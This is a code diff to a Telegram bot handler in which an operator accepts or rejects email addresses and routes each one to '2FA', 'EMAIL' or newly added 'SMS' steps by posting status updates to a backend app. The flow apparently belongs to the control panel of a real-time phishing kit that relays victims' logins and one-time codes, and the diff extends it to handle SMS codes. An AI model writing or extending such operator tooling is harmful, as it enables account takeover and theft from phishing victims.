@@ -31,13 +31,22 @@ bot.on("callback_query", async (query) => {
   try {
     const [action, email] = query.data.split("|");
 
-    console.log(`🔘 ${email} | ${action === "page1" ? "2FA" : action === "page2" ? "EMAIL" : "REJECT"}`);
+    console.log(`🔘 ${email} | ${action === "page1" ? "2FA" : action === "page2" ? "EMAIL" : action === "sms_accept" ? "SMS ACCEPT" : action === "sms_reject" ? "SMS REJECT" : "REJECT"}`);
 
     const response = await fetch(`${APP_URL}/update-status`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ email, status: action })
     });
+
+    // Also handle SMS status updates
+    if (action.includes("sms_")) {
+      await fetch(`${APP_URL}/update-sms-status`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email, status: action })
+      });
+    }
 
     if (response.ok) {
       // Remove buttons from original message by editing reply_markup
@@ -60,6 +69,10 @@ bot.on("callback_query", async (query) => {
         statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
       } else if (action === "page2") {
         statusMessage = `📧 <code>${email}</code> has been <b>ACCEPTED</b>! ✅`;
+      } else if (action === "sms_accept") {
+        statusMessage = `📱 <code>${email}</code> SMS <b>ACCEPTED</b>! ✅`;
+      } else if (action === "sms_reject") {
+        statusMessage = `📱 <code>${email}</code> SMS <b>REJECTED</b>! ❌`;
       } else if (action === "reject") {
         statusMessage = `📧 <code>${email}</code> has been <b>REJECTED</b>! ❌`;
       }
